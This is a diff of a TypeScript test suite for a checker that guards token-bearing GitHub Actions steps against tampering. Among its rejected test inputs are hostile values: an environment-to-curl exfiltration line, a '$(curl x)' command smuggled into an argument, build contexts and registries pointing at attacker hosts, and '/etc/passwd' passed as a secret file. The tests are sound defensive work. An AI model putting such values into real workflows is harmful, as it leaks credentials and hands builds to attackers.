@@ -21,7 +21,8 @@ function fixtureAllowList(file: string): Map<string, TokenStep> {
   return new Map<string, TokenStep>([
     [stepId(file, 'build', 'Install dependencies'), { kind: 'install' }],
     [stepId(file, 'build', 'Build image'), { kind: 'script', lines: ['docker build --secret id=node_auth_token,env=NODE_AUTH_TOKEN -t app .'] }],
-    [stepId(file, 'build', 'Build and push'), { kind: 'action', action: 'docker/build-push-action' }],
+    [stepId(file, 'build', 'Build and push'), { kind: 'action', uses: `docker/build-push-action@${SHA}` }],
+    [stepId(file, 'build', 'Fetch the coordinator'), { kind: 'checkout' }],
   ]);
 }
 
@@ -114,7 +115,7 @@ describe('workflow token guard on adversarial fixtures', () => {
     ['a05-ignore-scripts-false.yml', ['run-grammar']],
     ['a06-npm-install.yml', ['run-grammar']],
     ['a07-reused-step-name.yml', ['run-grammar']],
-    ['a08-bracket-index-in-with.yml', ['run-grammar', 'token-action', 'with']],
+    ['a08-bracket-index-in-with.yml', ['action-sha', 'run-grammar', 'token-action', 'with']],
     ['a09-trivy-owner-case.yml', ['trivy-unpinned']],
     ['a10-secrets-inherit.yml', ['job-secrets']],
     ['a11-chained-tests.yml', ['run-grammar']],
@@ -138,10 +139,10 @@ describe('workflow token guard on adversarial fixtures', () => {
     ['b14-container-job.yml', ['job-key']],
     ['b15-job-coordinator-repo.yml', ['scope-env']],
     ['b16-workflow-bash-func.yml', ['scope-env']],
-    ['b17-env-index-in-with.yml', ['all-env']],
-    ['b18-tojson-env-in-with.yml', ['all-env']],
+    ['b17-env-index-in-with.yml', ['action-with', 'all-env']],
+    ['b18-tojson-env-in-with.yml', ['action-with', 'all-env']],
     ['b19-indirect-github-env.yml', ['step-order']],
-    ['b20-earlier-github-script.yml', ['step-order']],
+    ['b20-earlier-github-script.yml', ['action-sha', 'step-order']],
     // Round 3 (wk-09b-i2): each one returned [] or another rule before this fix.
     ['d01-reusable-pass-token.yml', ['job-secrets']],
     ['d02-reusable-tojson-secrets.yml', ['job-secrets']],
@@ -157,12 +158,21 @@ describe('workflow token guard on adversarial fixtures', () => {
     ['d12-setup-node-version-file.yml', ['setup-with']],
     ['d13-setup-with-expression.yml', ['setup-with']],
     ['d14-setup-step-env.yml', ['setup-with']],
+    // wk-09b-i2: D1 the checkout line on a plain install entry, D5 a setup action at another
+    // commit, D10 the build action at another commit, X18 the pinned script broken across other lines.
+    ['e01-checkout-line-in-install.yml', ['run-grammar']],
+    ['e02-setup-node-imposter-sha.yml', ['action-pin']],
+    ['e03-build-push-any-sha.yml', ['action-pin', 'token-action']],
+    ['e04-script-lines-rebroken.yml', ['run-grammar']],
+    ['e05-build-push-remote-context.yml', ['action-with']],
+    // wk-09c-i2b: the publish job as it was, three steps after the build action's post stage was set.
+    ['f01-publish-verify-after-build.yml', ['post-stage', 'post-stage', 'post-stage']],
   ])('%s is flagged %j', (file, expected) => {
     expect(fixture(`adversarial/${file}`)).toEqual(expected);
   });
 
   it('lists a fixture for every case', () => {
-    expect(readdirSync(path.join(FIXTURES, 'adversarial')).length).toBe(48);
+    expect(readdirSync(path.join(FIXTURES, 'adversarial')).length).toBe(54);
   });
 });
 
@@ -171,8 +181,7 @@ describe('install grammar on allow-listed install steps', () => {
     'npm ci --ignore-scripts',
     'npm --prefix e2e/stack ci --ignore-scripts',
     'npm --prefix ../a_b.c/D-9 ci --ignore-scripts',
-    'npm --prefix e2e/stack run checkout',
-    'npm ci --ignore-scripts\n\n  npm --prefix e2e/stack run checkout\n',
+    'npm ci --ignore-scripts\n\n  npm --prefix e2e/stack ci --ignore-scripts\n',
     'npm ci --ignore-scripts ',
   ])('accepts %j', (run) => {
     expect(install(run)).toEqual([]);
@@ -195,6 +204,8 @@ describe('install grammar on allow-listed install steps', () => {
     'npm --prefix e2e/stack;curl ci --ignore-scripts',
     'npm --prefix $(curl x) ci --ignore-scripts',
     'npm --prefix  ci --ignore-scripts',
+    'npm --prefix e2e/stack run checkout',
+    'npm ci --ignore-scripts\nnpm --prefix e2e/stack run checkout',
     'npm --prefix e2e/stack run checkout; env',
     'npm --prefix e2e/stack run build',
     'npm ci --ignore-scripts\nnpm test',
@@ -207,7 +218,7 @@ describe('install grammar on allow-listed install steps', () => {
   });
 
   it('rejects a token-bearing install step that runs an action instead', () => {
-    expect(rules(step('Install dependencies', 'uses: actions/setup-node@v7'))).toEqual(['run-grammar', 'token-action']);
+    expect(rules(step('Install dependencies', 'uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1'))).toEqual(['run-grammar', 'token-action']);
   });
 
   it('applies no grammar to an allow-listed step that does not carry the token', () => {
@@ -232,20 +243,168 @@ describe('pinned script and pinned action on allow-listed build steps', () => {
     expect(rules(step('Build and push', `uses: docker/build-push-action@${SHA}`))).toEqual([]);
   });
 
-  it.each([
-    'docker/build-push-action@v7',
-    `docker/build-push-action@${SHA.slice(0, 7)}`,
-    `docker/build-push-action@${SHA}0`,
-    `evil/build-push-action@${SHA}`,
-    `docker/build-push-action-x@${SHA}`,
-    `xdocker/build-push-action@${SHA}`,
-    `Docker/build-push-action@${SHA}`,
-  ])('rejects %s on the allowed-action step', (uses) => {
-    expect(rules(step('Build and push', `uses: ${uses}`))).toEqual(['token-action']);
+  // Another ref of the pinned action is also an action-pin wherever it is used.
+  it.each<[string, Rule[]]>([
+    ['docker/build-push-action@v7', ['action-pin', 'token-action']],
+    [`docker/build-push-action@${SHA.slice(0, 7)}`, ['action-pin', 'token-action']],
+    [`docker/build-push-action@${SHA}0`, ['action-pin', 'token-action']],
+    [`docker/build-push-action@${'0123456789abcdef'.repeat(3).slice(0, 40)}`, ['action-pin', 'token-action']],
+    // wk-09c-i3: another action at a full SHA in a token job may also run a pre: stage.
+    [`evil/build-push-action@${SHA}`, ['pre-stage', 'token-action']],
+    [`docker/build-push-action-x@${SHA}`, ['pre-stage', 'token-action']],
+    [`xdocker/build-push-action@${SHA}`, ['pre-stage', 'token-action']],
+    [`Docker/build-push-action@${SHA}`, ['token-action']],
+  ])('rejects %s on the allowed-action step', (uses, expected) => {
+    expect(rules(step('Build and push', `uses: ${uses}`))).toEqual(expected);
   });
 
   it('rejects the allowed-action step when it runs a script instead', () => {
     expect(rules(step('Build and push', 'run: npm ci --ignore-scripts'))).toEqual(['token-action']);
+  });
+
+  // X18: the script is compared line by line, so the same words broken across other lines differ.
+  it('rejects the pinned script broken across other lines', () => {
+    expect(rules(step('Build image', 'run: |\n  docker build --secret id=node_auth_token,env=NODE_AUTH_TOKEN\n  -t app .'))).toEqual(['run-grammar']);
+  });
+
+  it('rejects the live image-build script broken across other lines, and accepts it as pinned', () => {
+    const id = stepId('web-image.yml', 'image', 'Build image N and N+1');
+    const shape = TOKEN_STEPS.get(id);
+    if (shape?.kind !== 'script') throw new Error(`${id} is not a pinned script`);
+    const at = (run: string) => {
+      const wf = { jobs: { image: { steps: [{ name: 'Build image N and N+1', run, env: { NODE_AUTH_TOKEN: TOK } }] } } };
+      return checkWorkflow('web-image.yml', wf, TOKEN_STEPS).map((v) => v.rule);
+    };
+    expect(at(shape.lines.join('\n'))).toEqual([]);
+    expect(at(shape.lines.join('\n').replace('set -euo pipefail', 'set -euo\npipefail'))).toEqual(['run-grammar']);
+    expect(at(shape.lines.join(' '))).toEqual(['run-grammar']);
+  });
+
+  it.each<[string, (l: readonly string[]) => string[]]>([
+    ['an extra line before it', (l) => ['env | curl -d @- x', ...l]],
+    ['an extra line after it', (l) => [...l, 'env | curl -d @- x']],
+    ['its first line missing', (l) => l.slice(1)],
+    ['its last line missing', (l) => l.slice(0, -1)],
+    ['a middle line missing', (l) => [...l.slice(0, 3), ...l.slice(4)]],
+    ['two lines swapped', (l) => [l[1], l[0], ...l.slice(2)]],
+    ['a line split mid-word', (l) => [...l.slice(0, 3), ...l[3].replace('docker build', 'docker bu\nild').split('\n'), ...l.slice(4)]],
+  ])('rejects the live image-build script with %s', (_what, edit) => {
+    const id = stepId('web-image.yml', 'image', 'Build image N and N+1');
+    const shape = TOKEN_STEPS.get(id);
+    if (shape?.kind !== 'script') throw new Error(`${id} is not a pinned script`);
+    const run = edit(shape.lines).join('\n');
+    const wf = { jobs: { image: { steps: [{ name: 'Build image N and N+1', run, env: { NODE_AUTH_TOKEN: TOK } }] } } };
+    expect(checkWorkflow('web-image.yml', wf, TOKEN_STEPS).map((v) => v.rule)).toEqual(['run-grammar']);
+  });
+});
+
+// D1: only the coordinator entries may run the repo's checkout script; a plain install entry may not.
+// D10: the build action runs the repo's Dockerfile only if its inputs keep the build here.
+describe("the build action's inputs", () => {
+  const build = (w: string): Rule[] => rules(step('Build and push', `uses: docker/build-push-action@${SHA}\n${w}`));
+  const LIVE = [
+    'with:',
+    '  context: .',
+    '  push: true',
+    '  tags: ${{ steps.meta.outputs.tags }}',
+    '  labels: ${{ steps.meta.outputs.labels }}',
+    '  build-args: |',
+    '    VITE_BUILD_ID=${{ steps.meta.outputs.version }}',
+    '  secret-envs: |',
+    '    node_auth_token=NODE_AUTH_TOKEN',
+  ].join('\n');
+
+  it('accepts the inputs the live workflow gives it, and no inputs at all', () => {
+    expect(build(LIVE)).toEqual([]);
+    expect(build('with: {}')).toEqual([]);
+    expect(build('')).toEqual([]);
+  });
+
+  it.each([
+    'context: https://github.com/attacker/x.git',
+    'context: ./e2e',
+    'context: "${{ github.event.inputs.ctx }}"',
+    'file: ./evil.Dockerfile',
+    'build-contexts: x=https://github.com/attacker/x.git',
+    'builder: remote',
+    'secret-files: x=/etc/passwd',
+    'push: "${{ github.event.inputs.push }}"',
+    'build-args: NPM_CONFIG_REGISTRY=https://evil.example',
+    'build-args: |\n    VITE_BUILD_ID=${{ steps.meta.outputs.version }}\n    NPM_CONFIG_REGISTRY=https://evil.example',
+    'secret-envs: x=NODE_AUTH_TOKEN',
+    'secret-envs: |\n    node_auth_token=NODE_AUTH_TOKEN\n    home=HOME',
+    // wk-09c-i1: an extra line before the allowed one, the line missing or cut short, the pair swapped.
+    'build-args: |\n    NPM_CONFIG_REGISTRY=https://evil.example\n    VITE_BUILD_ID=${{ steps.meta.outputs.version }}',
+    'build-args: |\n    HTTPS_PROXY=http://evil.example\n    VITE_BUILD_ID=${{ steps.meta.outputs.version }}',
+    "build-args: ''",
+    'build-args: VITE_BUILD_ID=',
+    'build-args: "${{ steps.meta.outputs.version }}"',
+    'secret-envs: |\n    x=NODE_AUTH_TOKEN\n    node_auth_token=NODE_AUTH_TOKEN',
+    "secret-envs: ''",
+    'secret-envs: node_auth_token=',
+    'secret-envs: NODE_AUTH_TOKEN',
+    'secret-envs: NODE_AUTH_TOKEN=node_auth_token',
+    'context: e2e/.',
+    "context: ''",
+    // wk-09c-i2: the ARG name is case-sensitive, the pair is not swapped, and the context is . exactly.
+    'build-args: vite_build_id=${{ steps.meta.outputs.version }}',
+    'build-args: ${{ steps.meta.outputs.version }}=VITE_BUILD_ID',
+    'context: " . "',
+    // wk-09c-i2b: the allowed value split across lines is two entries; ./ is not . exactly.
+    'build-args: |\n    VITE_BUILD_ID=\n    ${{ steps.meta.outputs.version }}',
+    'secret-envs: |\n    node_auth_token=\n    NODE_AUTH_TOKEN',
+    'context: ./',
+  ])('flags with: %s', (input) => {
+    expect(build(`with:\n  ${input}`)).toEqual(['action-with']);
+  });
+
+  it('flags with: as one expression or a list', () => {
+    expect(build('with: ${{ fromJSON(vars.BUILD) }}')).toEqual(['action-with']);
+    expect(build('with:\n  - context: .')).toEqual(['action-with']);
+  });
+
+  it('takes no input on an allow-listed action that has no input list', () => {
+    const uses = 'actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9';
+    const allowed = new Map<string, TokenStep>([[stepId('x.yml', 'build', 'Upload'), { kind: 'action', uses }]]);
+    const check = (w: string): Rule[] => checkWorkflow('x.yml', parse(step('Upload', `uses: ${uses}${w}`)), allowed).map((v) => v.rule);
+    expect(check('')).toEqual([]);
+    expect(check('\nwith:\n  path: dist')).toEqual(['action-with']);
+  });
+
+  it('judges the inputs only at the pinned action', () => {
+    expect(build('with:\n  context: .')).toEqual([]);
+    expect(rules(step('Build and push', 'uses: docker/build-push-action@v7\nwith:\n  file: x'))).toEqual(['action-pin', 'token-action']);
+  });
+});
+
+describe('the coordinator checkout on its own entries', () => {
+  const checkout = (run: string): Rule[] => rules(step('Fetch the coordinator', `run: ${JSON.stringify(run)}`));
+
+  it.each(['npm --prefix e2e/stack run checkout', 'npm --prefix e2e/stack ci --ignore-scripts\nnpm --prefix e2e/stack run checkout', 'npm ci --ignore-scripts'])(
+    'accepts %j on a checkout entry',
+    (run) => {
+      expect(checkout(run)).toEqual([]);
+    },
+  );
+
+  it.each(['npm --prefix e2e/stack run checkout; env', 'env; npm --prefix e2e/stack run checkout', 'npm --prefix e2e/stack run build', 'npm run checkout', 'npm --prefix e2e/stack run checkout\nnpm test', ''])(
+    'rejects %j on a checkout entry',
+    (run) => {
+      expect(checkout(run)).toEqual(['run-grammar']);
+    },
+  );
+
+  it('binds the checkout kind to the two coordinator entries of the live allow-list', () => {
+    const ids = [...TOKEN_STEPS].filter(([, s]) => s.kind === 'checkout').map(([id]) => id);
+    expect(ids).toEqual([
+      stepId('stack.yml', 'stack', 'Fetch and install the pinned coordinator'),
+      stepId('web-image.yml', 'image', 'Install harness dependencies and the pinned coordinator'),
+    ]);
+  });
+
+  it('flags the checkout line appended to the build.yml install step', () => {
+    const wf = parse(step('Install dependencies', 'run: |\n  npm ci --ignore-scripts\n  npm --prefix e2e/stack run checkout'));
+    expect(checkWorkflow('build.yml', wf, TOKEN_STEPS)).toEqual([{ file: 'build.yml', where: 'build > Install dependencies > run', rule: 'run-grammar' }]);
   });
 });
 
@@ -260,7 +419,7 @@ describe('token references, case-insensitive', () => {
     '${{ env.node_auth_token }}',
     "${{ env['NODE_AUTH_TOKEN'] }}",
   ])('flags %s in with: even on the allowed-action step', (ref) => {
-    expect(rules(step('Build and push', `uses: docker/build-push-action@${SHA}\nwith:\n  token: ${JSON.stringify(ref)}`))).toEqual(['with']);
+    expect(rules(step('Build and push', `uses: docker/build-push-action@${SHA}\nwith:\n  tags: ${JSON.stringify(ref)}`))).toEqual(['with']);
   });
 
   it.each(['echo $NODE_AUTH_TOKEN', 'echo ${NODE_AUTH_TOKEN}', 'echo $node_auth_token', 'echo ${{ secrets.NODE_AUTH_TOKEN }}'])(
@@ -473,13 +632,23 @@ describe('what may change how a token step runs', () => {
   );
 
   it('accepts the setup actions before the token steps, and untokened steps after the last one', () => {
-    const before = ['actions/checkout@v7', 'actions/setup-node@v7', 'docker/setup-buildx-action@v4', 'docker/metadata-action@v6', 'Docker/Login-Action@v4']
+    const before = ['actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1', 'actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1', 'docker/setup-buildx-action@f87e5991a6d7451dcb8d9637bfbc97413f497069', 'docker/metadata-action@dc802804100637a589fabce1cb79ff13a1411302', 'Docker/Login-Action@dbcb813823bdd20940b903addbd779551569679f']
       .map((u) => `      - uses: ${u}\n`)
       .join('');
-    expect(rules(`${tokenJob('', before)}      - run: npm test\n      - uses: evil/action@v1\n`)).toEqual([]);
+    expect(rules(`${tokenJob('', before)}      - run: npm test\n      - uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9\n`)).toEqual([]);
   });
 
-  it.each(['run: npm run build', 'uses: ./.github/actions/local', 'uses: docker://evil/image', 'uses: actions/github-script@v8', 'uses: evil/checkout@v7', 'uses: actions/checkout-x@v7', 'uses: xactions/checkout@v7', 'uses: actions/checkout', 'uses: evil/login-action@v4', 'uses: docker/login-action-x@v4'])(
+  it.each([
+    'run: npm run build',
+    'uses: ./.github/actions/local',
+    'uses: docker://evil/image',
+    'uses: actions/checkout',
+    // Another spelling of a setup action runs it, but only the plain spelling may come first.
+    'uses: actions//checkout@3d3c42e5aac5ba805825da76410c181273ba90b1',
+    'uses: actions/checkout/@3d3c42e5aac5ba805825da76410c181273ba90b1',
+    'uses: /actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1',
+    'uses: actions\\checkout@3d3c42e5aac5ba805825da76410c181273ba90b1',
+  ])(
     'flags %s before a token step',
     (body) => {
       expect(checkWorkflow('x.yml', parse(tokenJob('', `      - ${body}\n`)), fixtureAllowList('x.yml'))).toEqual([
@@ -488,14 +657,28 @@ describe('what may change how a token step runs', () => {
     },
   );
 
+  it.each([
+    `actions/github-script@${SHA}`,
+    `evil/checkout@${SHA}`,
+    `actions/checkout-x@${SHA}`,
+    `xactions/checkout@${SHA}`,
+    `evil/login-action@${SHA}`,
+    `docker/login-action-x@${SHA}`,
+  ])('flags %s before a token step twice: wrong place, may run a pre: stage', (uses) => {
+    expect(checkWorkflow('x.yml', parse(tokenJob('', `      - uses: ${uses}\n`)), fixtureAllowList('x.yml'))).toEqual([
+      { file: 'x.yml', where: 'build > #0 > step', rule: 'step-order' },
+      { file: 'x.yml', where: 'build > #0 > uses', rule: 'pre-stage' },
+    ]);
+  });
+
   it('accepts the with: inputs the live workflows give the setup actions', () => {
     const before = [
-      "actions/setup-node@v7\n        with:\n          node-version: '24'\n          cache: 'npm'\n          cache-dependency-path: |\n            package-lock.json\n            e2e/stack/package-lock.json",
-      'actions/setup-node@v7\n        with:\n          node-version: ${{ matrix.node-version }}\n          registry-url: https://npm.pkg.github.com',
-      'actions/setup-node@v7\n        with:\n          node-version: 24\n        env:',
-      'docker/metadata-action@v6\n        with:\n          images: ghcr.io/figurecollecting/fc-mobile-web\n          tags: |\n            type=sha,format=short,prefix=sha-',
-      'docker/login-action@v4\n        with:\n          registry: ghcr.io\n          username: ${{ github.actor }}\n          password: ${{ secrets.GITHUB_TOKEN }}',
-      'actions/checkout@v7\n        with:',
+      "actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1\n        with:\n          node-version: '24'\n          cache: 'npm'\n          cache-dependency-path: |\n            package-lock.json\n            e2e/stack/package-lock.json",
+      'actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1\n        with:\n          node-version: ${{ matrix.node-version }}\n          registry-url: https://npm.pkg.github.com',
+      'actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1\n        with:\n          node-version: 24\n        env:',
+      'docker/metadata-action@dc802804100637a589fabce1cb79ff13a1411302\n        with:\n          images: ghcr.io/figurecollecting/fc-mobile-web\n          tags: |\n            type=sha,format=short,prefix=sha-',
+      'docker/login-action@dbcb813823bdd20940b903addbd779551569679f\n        with:\n          registry: ghcr.io\n          username: ${{ github.actor }}\n          password: ${{ secrets.GITHUB_TOKEN }}',
+      'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n        with:',
     ]
       .map((u) => `      - uses: ${u}\n`)
       .join('');
@@ -503,28 +686,42 @@ describe('what may change how a token step runs', () => {
   });
 
   it.each([
-    ['actions/checkout@v7', 'repository: attacker/fc-mobile'],
-    ['actions/checkout@v7', 'ref: main'],
-    ['actions/checkout@v7', 'path: e2e/stack'],
-    ['actions/setup-node@v7', 'mirror: https://attacker.example/node'],
-    ['actions/setup-node@v7', 'node-version-file: .nvmrc'],
-    ['actions/setup-node@v7', 'registry-url: https://npm.pkg.github.com/'],
-    ['actions/setup-node@v7', 'registry-url: https://registry.npmjs.org'],
-    ['actions/setup-node@v7', 'node-version: ${{ vars.NODE_VERSION }}'],
-    ['actions/setup-node@v7', "cache: ${{ 'npm' }}"],
-    ['actions/setup-node@v7', 'cache-dependency-path: ${{ vars.LOCK }}'],
-    ['actions/setup-node@v7', 'Node-Version: 24'],
-    ['actions/setup-node@v7', 'constructor: x'],
-    ['docker/setup-buildx-action@v4', 'driver: remote'],
-    ['docker/setup-buildx-action@v4', 'endpoint: tcp://attacker.example:1234'],
-    ['docker/metadata-action@v6', 'images: ${{ vars.IMAGE }}'],
-    ['docker/metadata-action@v6', 'tags: ${{ vars.TAGS }}'],
-    ['docker/metadata-action@v6', 'flavor: latest=true'],
-    ['docker/metadata-action@v6', 'images: ghcr.io/${{ vars.OWNER }}/web'],
-    ['actions/setup-node@v7', "cache: { a: '${{ vars.CACHE }}' }"],
-    ['Docker/Login-Action@v4', 'registry: attacker.example'],
-    ['docker/login-action@v4', 'username: ${{ vars.USER }}'],
-    ['docker/login-action@v4', 'password: ${{ secrets.OTHER }}'],
+    ['actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1', 'repository: attacker/fc-mobile'],
+    ['actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1', 'ref: main'],
+    ['actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1', 'path: e2e/stack'],
+    ['actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1', 'mirror: https://attacker.example/node'],
+    ['actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1', 'node-version-file: .nvmrc'],
+    ['actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1', 'registry-url: https://npm.pkg.github.com/'],
+    ['actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1', 'registry-url: https://registry.npmjs.org'],
+    ['actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1', 'node-version: ${{ vars.NODE_VERSION }}'],
+    ['actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1', "cache: ${{ 'npm' }}"],
+    ['actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1', 'cache-dependency-path: ${{ vars.LOCK }}'],
+    ['actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1', 'Node-Version: 24'],
+    ['actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1', 'constructor: x'],
+    ['docker/setup-buildx-action@f87e5991a6d7451dcb8d9637bfbc97413f497069', 'driver: remote'],
+    ['docker/setup-buildx-action@f87e5991a6d7451dcb8d9637bfbc97413f497069', 'endpoint: tcp://attacker.example:1234'],
+    ['docker/metadata-action@dc802804100637a589fabce1cb79ff13a1411302', 'images: ${{ vars.IMAGE }}'],
+    ['docker/metadata-action@dc802804100637a589fabce1cb79ff13a1411302', 'tags: ${{ vars.TAGS }}'],
+    ['docker/metadata-action@dc802804100637a589fabce1cb79ff13a1411302', 'flavor: latest=true'],
+    ['docker/metadata-action@dc802804100637a589fabce1cb79ff13a1411302', 'images: ghcr.io/${{ vars.OWNER }}/web'],
+    ['actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1', "cache: { a: '${{ vars.CACHE }}' }"],
+    ['Docker/Login-Action@dbcb813823bdd20940b903addbd779551569679f', 'registry: attacker.example'],
+    ['docker/login-action@dbcb813823bdd20940b903addbd779551569679f', 'username: ${{ vars.USER }}'],
+    ['docker/login-action@dbcb813823bdd20940b903addbd779551569679f', 'password: ${{ secrets.OTHER }}'],
+    // wk-09c-i1: each exact value with something after it, something before it, and empty.
+    ['actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1', 'registry-url: https://evil.example/https://npm.pkg.github.com'],
+    ['actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1', "registry-url: ''"],
+    ['actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1', 'node-version: ${{ matrix.node-version }}${{ vars.V }}'],
+    ['actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1', 'node-version: ${{ vars.V }}${{ matrix.node-version }}'],
+    ['docker/login-action@dbcb813823bdd20940b903addbd779551569679f', 'registry: ghcr.io.evil.example'],
+    ['docker/login-action@dbcb813823bdd20940b903addbd779551569679f', 'registry: evil-ghcr.io'],
+    ['docker/login-action@dbcb813823bdd20940b903addbd779551569679f', "registry: ''"],
+    ['docker/login-action@dbcb813823bdd20940b903addbd779551569679f', 'username: ${{ github.actor }}x'],
+    ['docker/login-action@dbcb813823bdd20940b903addbd779551569679f', 'username: x${{ github.actor }}'],
+    ['docker/login-action@dbcb813823bdd20940b903addbd779551569679f', "username: ''"],
+    ['docker/login-action@dbcb813823bdd20940b903addbd779551569679f', 'password: ${{ secrets.GITHUB_TOKEN }}x'],
+    ['docker/login-action@dbcb813823bdd20940b903addbd779551569679f', 'password: x${{ secrets.GITHUB_TOKEN }}'],
+    ['docker/login-action@dbcb813823bdd20940b903addbd779551569679f', "password: ''"],
   ])('flags %s with %s before a token step', (uses, input) => {
     expect(checkWorkflow('x.yml', parse(tokenJob('', `      - uses: ${uses}\n        with:\n          ${input}\n`)), fixtureAllowList('x.yml'))).toEqual([
       { file: 'x.yml', where: 'build > #0 > with', rule: 'setup-with' },
@@ -532,19 +729,19 @@ describe('what may change how a token step runs', () => {
   });
 
   it.each(["'${{ fromJSON(vars.WITH) }}'", '[node-version]'])('flags with: %s on a setup action before a token step', (value) => {
-    expect(checkWorkflow('x.yml', parse(tokenJob('', `      - uses: actions/setup-node@v7\n        with: ${value}\n`)), fixtureAllowList('x.yml'))).toEqual([
+    expect(checkWorkflow('x.yml', parse(tokenJob('', `      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1\n        with: ${value}\n`)), fixtureAllowList('x.yml'))).toEqual([
       { file: 'x.yml', where: 'build > #0 > with', rule: 'setup-with' },
     ]);
   });
 
   it('flags env on a setup action before a token step', () => {
-    expect(checkWorkflow('x.yml', parse(tokenJob('', '      - uses: actions/checkout@v7\n        env:\n          NODE_OPTIONS: x\n')), fixtureAllowList('x.yml'))).toEqual([
+    expect(checkWorkflow('x.yml', parse(tokenJob('', '      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n        env:\n          NODE_OPTIONS: x\n')), fixtureAllowList('x.yml'))).toEqual([
       { file: 'x.yml', where: 'build > #0 > env', rule: 'setup-with' },
     ]);
   });
 
   it('leaves the inputs of a setup action alone after the last token step and in a job without one', () => {
-    const setup = '      - uses: actions/setup-node@v7\n        with:\n          mirror: https://x.example\n        env:\n          A: b\n';
+    const setup = '      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1\n        with:\n          mirror: https://x.example\n        env:\n          A: b\n';
     expect(rules(tokenJob() + setup)).toEqual([]);
     expect(rules(`jobs:\n  t:\n    steps:\n${setup}`)).toEqual([]);
   });
@@ -555,6 +752,104 @@ describe('what may change how a token step runs', () => {
 
   it('leaves a $GITHUB_ENV write alone in a job without a token step', () => {
     expect(rules(`${tokenJob()}  t:\n    steps:\n      - run: echo "A=1" >> "$GITHUB_ENV"\n`)).toEqual([]);
+  });
+});
+
+// wk-09c-i2b: an action's post stage runs after every later step of its job, with the step's env
+// (the token) still set (actions/runner ActionRunner.cs registers it with the same step; StepsRunner.cs
+// merges $GITHUB_ENV into its env and runs it from PATH). So nothing may follow a token step that
+// runs an action, in the same job: no run: step, no action at any commit, no other token step.
+const BUILD_PUSH = `      - name: Build and push\n        uses: docker/build-push-action@${SHA}\n        env:\n          NODE_AUTH_TOKEN: ${TOK}\n`;
+const actionJob = (after = '', before = ''): string => `jobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n${before}${BUILD_PUSH}${after}`;
+
+describe('nothing after a token step that runs an action', () => {
+  it('accepts the token action as the last step, after setup actions and a token install', () => {
+    expect(rules(actionJob('', `      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n${TOKEN_INSTALL}`))).toEqual([]);
+  });
+
+  it.each([
+    'run: npm test',
+    'run: bash ./scripts/tidy.sh',
+    `run: 'v=GITHUB_; v="\${v}PATH"; echo "$PWD/bin" >> "\${!v}"'`,
+    "run: echo ok\n        if: always()",
+    'uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1',
+    'uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9',
+    'uses: ./.github/actions/local',
+    'uses: docker://alpine:3',
+  ])('flags %s after it, and names the step', (body) => {
+    expect(checkWorkflow('x.yml', parse(actionJob(`      - name: Later\n        ${body}\n`)), fixtureAllowList('x.yml'))).toEqual([
+      { file: 'x.yml', where: 'build > Later > step', rule: 'post-stage' },
+    ]);
+  });
+
+  it('flags every step after it, an unnamed one by its index', () => {
+    expect(checkWorkflow('x.yml', parse(actionJob('      - run: npm test\n      - name: Test\n        run: npm test\n')), fixtureAllowList('x.yml'))).toEqual([
+      { file: 'x.yml', where: 'build > #1 > step', rule: 'post-stage' },
+      { file: 'x.yml', where: 'build > Test > step', rule: 'post-stage' },
+    ]);
+  });
+
+  it('flags a token step after it: a token install, and a second run of the token action', () => {
+    expect(checkWorkflow('x.yml', parse(actionJob(TOKEN_INSTALL)), fixtureAllowList('x.yml'))).toEqual([
+      { file: 'x.yml', where: 'build > Install dependencies > step', rule: 'post-stage' },
+    ]);
+    expect(checkWorkflow('x.yml', parse(actionJob(BUILD_PUSH)), fixtureAllowList('x.yml'))).toEqual([
+      { file: 'x.yml', where: 'build > Build and push > step', rule: 'post-stage' },
+    ]);
+  });
+
+  it('reads the job, not the allow-list: steps after an unlisted token action are flagged too', () => {
+    const job = `jobs:\n  build:\n    steps:\n      - name: Publish\n        uses: ./.github/actions/publish\n        env:\n          NODE_AUTH_TOKEN: ${TOK}\n      - name: Later\n        run: npm test\n`;
+    expect(checkWorkflow('x.yml', parse(job), fixtureAllowList('x.yml'))).toEqual([
+      { file: 'x.yml', where: 'build > Publish > env', rule: 'non-install-step' },
+      { file: 'x.yml', where: 'build > Later > step', rule: 'post-stage' },
+    ]);
+  });
+
+  it('leaves steps after a token run: step, and after an untokened action, alone', () => {
+    expect(rules(`${tokenJob()}      - uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9\n      - run: npm test\n`)).toEqual([]);
+    expect(rules('jobs:\n  t:\n    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n      - run: npm test\n')).toEqual([]);
+  });
+
